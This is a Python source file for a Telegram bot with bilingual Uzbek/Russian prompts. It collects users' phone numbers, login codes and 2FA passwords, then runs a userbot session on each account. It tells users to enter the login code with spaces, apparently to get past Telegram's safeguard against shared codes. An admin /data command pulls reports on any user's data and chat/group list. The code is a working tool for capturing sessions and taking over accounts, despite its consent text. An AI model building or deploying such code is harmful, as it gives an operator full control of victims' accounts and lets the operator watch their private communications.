from __future__ import annotations

import logging

from aiogram import F, Router
from aiogram.filters import Command
from aiogram.types import (
    BufferedInputFile,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
)
from telethon.errors import (
    FloodWaitError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)

from userbot.manager import LoginFlowError, UserbotManager


logger = logging.getLogger(__name__)
router = Router()
PHONE_PROMPT = (
    "Telefon raqamingizni yuborin | "
    "\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u0441\u0432\u043e\u0439 "
    "\u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430"
)
PHONE_BUTTON_TEXT = (
    "Jo'natish | "
    "\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c"
)
CODE_PROMPT = (
    "Kodni yuborishda raqamlar orasida bo\u2018sh joy bo\u2018lishi kerak | "
    "\u041f\u0440\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0435 "
    "\u043a\u043e\u0434\u0430 \u043c\u0435\u0436\u0434\u0443 "
    "\u0446\u0438\u0444\u0440\u0430\u043c\u0438 \u0434\u043e\u043b\u0436\u0435\u043d "
    "\u0431\u044b\u0442\u044c \u043f\u0440\u043e\u0431\u0435\u043b: 1 2 3 4 5"
)
TWO_FA_PROMPT = (
    "Ushbu akkauntda 2FA yoqilgan. 2FA parolni bo'sh joylarsiz kiriting. | "
    "\u041d\u0430 \u044d\u0442\u043e\u043c \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0435 "
    "\u0432\u043a\u043b\u044e\u0447\u0435\u043d\u0430 2FA. "
    "\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0430\u0440\u043e\u043b\u044c "
    "2FA \u0431\u0435\u0437 \u043f\u0440\u043e\u0431\u0435\u043b\u043e\u0432."
)
TWO_FA_INVALID_TEXT = (
    "2FA parol noto'g'ri. Parolni bo'sh joylarsiz qayta kiriting. | "
    "\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043f\u0430\u0440\u043e\u043b\u044c "
    "2FA. \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0430\u0440\u043e\u043b\u044c "
    "\u0431\u0435\u0437 \u043f\u0440\u043e\u0431\u0435\u043b\u043e\u0432 "
    "\u0435\u0449\u0435 \u0440\u0430\u0437."
)
LOGIN_SUCCESS_TEXT = (
    "Kirish muvaffaqiyatli. Userbot faol. | "
    "\u0412\u0445\u043e\u0434 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d "
    "\u0443\u0441\u043f\u0435\u0448\u043d\u043e. Userbot \u0430\u043a\u0442\u0438\u0432\u0435\u043d."
)
AGREEMENT_TEXT = """Foydalanuvchi roziligi

Ushbu botdan foydalanish orqali siz quyidagilarga rozilik bildirasiz:

1. Siz telefon raqamingizni o'zingiz yuborasiz.
2. Telegram login kodini va 2FA parolini faqat o'zingiz kiritasiz.
3. Bot sizning Telegram akkauntingiz uchun userbot sessiyasini ishga tushiradi.
4. /logout yuborsangiz, bot sessiyani Telegramdan chiqaradi, ulanishni uzadi va lokal saqlangan sessiya fayllarini hamda vaqtinchalik ma'lumotlarni o'chiradi.
5. Admin noqonuniy harakatlar, suiiste'mol yoki nizolarning oldini olish uchun foydalanuvchiga tegishli texnik ma'lumotlar va chat/guruhlar ro'yxati bo'yicha hisobot olishi mumkin.

Согласие пользователя

Используя этого бота, вы соглашаетесь со следующим:

1. Вы сами отправляете свой номер телефона.
2. Код входа Telegram и пароль 2FA вводите только вы сами.
3. Бот запускает userbot-сессию для вашего Telegram-аккаунта.
4. Если вы отправите /logout, бот выйдет из Telegram-сессии, отключит соединение и удалит локальные файлы сессии и временные данные.
5. Администратор может получить технические данные пользователя и отчет по чатам/группам, чтобы предотвратить незаконные действия, злоупотребления или споры.
"""


def _bot_user_id(message: Message) -> int | None:
    return message.from_user.id if message.from_user else None


def _clean_code(text: str) -> str:
    return "".join(ch for ch in text if ch.isdigit())


def _clean_password(text: str) -> str:
    return "".join(text.split())


def _phone_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text=PHONE_BUTTON_TEXT,
                    request_contact=True,
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=True,
    )


async def _send_report_file(
    message: Message,
    text: str,
    filename: str = "userbot_data.txt",
) -> None:
    report = BufferedInputFile(
        text.encode("utf-8"),
        filename=filename,
    )
    await message.answer_document(report)


async def _delete_sensitive_message(message: Message) -> None:
    try:
        await message.delete()
    except Exception:
        pass


async def _ask_for_phone(message: Message, manager: UserbotManager) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    if manager.is_running(bot_user_id):
        await message.answer("Userbot is already active.")
        return

    if manager.session_file_exists(bot_user_id):
        started = await manager.start_user(bot_user_id)
        if started:
            await message.answer("Existing session found. Userbot is active.")
            return

    await manager.begin_login(bot_user_id)
    await message.answer(PHONE_PROMPT, reply_markup=_phone_keyboard())


@router.message(Command("start", "login"))
async def start_or_login(message: Message, manager: UserbotManager) -> None:
    await _ask_for_phone(message, manager)


@router.message(Command("logout"))
async def logout(message: Message, manager: UserbotManager) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    await manager.stop_user(bot_user_id, delete_session=True)
    await message.answer("Logged out successfully. Session file was removed.")


@router.message(Command("status"))
async def status(message: Message, manager: UserbotManager) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    await message.answer(await manager.status_text(bot_user_id))


@router.message(Command("data"))
async def data(message: Message, manager: UserbotManager) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    if not await manager.is_admin(bot_user_id):
        await message.answer("Access denied.")
        return

    parts = (message.text or "").split(maxsplit=1)
    if len(parts) == 1:
        await _send_report_file(message, await manager.admin_data_text())
        return

    target_text = parts[1].strip()
    if not target_text.isdigit():
        await message.answer("Usage: /data or /data <bot_user_id>")
        return

    target_user_id = int(target_text)
    await _send_report_file(
        message,
        await manager.user_data_text(target_user_id),
        filename=f"userbot_{target_user_id}_data.txt",
    )


@router.message(F.contact)
async def contact_login_step(message: Message, manager: UserbotManager) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    state = manager.login_states.get(bot_user_id)
    if not state or state.step != "phone":
        await message.answer("Send /login to start a login flow.", reply_markup=ReplyKeyboardRemove())
        return

    await _handle_phone(message, manager, message.contact.phone_number)


@router.message(F.text)
async def login_text_steps(message: Message, manager: UserbotManager) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None or message.text is None:
        return

    state = manager.login_states.get(bot_user_id)
    if not state:
        await message.answer("Send /login to start or /status to check your userbot.")
        return

    if state.step == "phone":
        await _handle_phone(message, manager, message.text.strip())
        return

    if state.step == "code":
        await _handle_code(message, manager, message.text)
        return

    if state.step == "password":
        await _handle_password(message, manager, message.text)
        return

    await message.answer("Unknown login step. Send /login to start again.")


async def _handle_phone(message: Message, manager: UserbotManager, phone: str) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    await message.answer("Sending Telegram login code...", reply_markup=ReplyKeyboardRemove())
    try:
        await manager.request_code(bot_user_id, phone)
    except PhoneNumberInvalidError:
        await manager.begin_login(bot_user_id)
        await message.answer("That phone number was rejected by Telegram. Send it again.")
    except FloodWaitError as exc:
        await manager.begin_login(bot_user_id)
        await message.answer(f"Telegram rate limited this login. Try again in {exc.seconds} seconds.")
    except Exception as exc:
        await manager.begin_login(bot_user_id)
        logger.warning("Could not send login code for bot user %s: %s", bot_user_id, exc.__class__.__name__)
        await message.answer("Could not send the login code. Send /login to try again.")
    else:
        await message.answer(CODE_PROMPT)


async def _handle_code(message: Message, manager: UserbotManager, raw_code: str) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    code = _clean_code(raw_code)
    if not code:
        await message.answer(CODE_PROMPT)
        return

    try:
        await manager.submit_code(bot_user_id, code)
    except SessionPasswordNeededError:
        await manager.mark_password_required(bot_user_id)
        await message.answer(TWO_FA_PROMPT)
    except PhoneCodeInvalidError:
        await message.answer("Invalid code. Enter the code again.")
    except PhoneCodeExpiredError:
        await manager.begin_login(bot_user_id)
        await message.answer("Telegram expired that code. Send your phone number again.")
    except LoginFlowError as exc:
        await message.answer(str(exc))
    except Exception as exc:
        logger.warning("Could not complete code login for bot user %s: %s", bot_user_id, exc.__class__.__name__)
        await message.answer("Could not complete login. Send /login to try again.")
    else:
        await message.answer(LOGIN_SUCCESS_TEXT)
    finally:
        await _delete_sensitive_message(message)


async def _handle_password(message: Message, manager: UserbotManager, password: str) -> None:
    bot_user_id = _bot_user_id(message)
    if bot_user_id is None:
        return

    password = _clean_password(password)
    try:
        await manager.submit_password(bot_user_id, password)
    except PasswordHashInvalidError:
        await message.answer(TWO_FA_INVALID_TEXT)
    except LoginFlowError as exc:
        await message.answer(str(exc))
    except Exception as exc:
        logger.warning("Could not complete 2FA login for bot user %s: %s", bot_user_id, exc.__class__.__name__)
        await message.answer("Could not complete 2FA login. Send /login to try again.")
    else:
        await message.answer(LOGIN_SUCCESS_TEXT)
    finally:
        await _delete_sensitive_message(message)
        password = ""
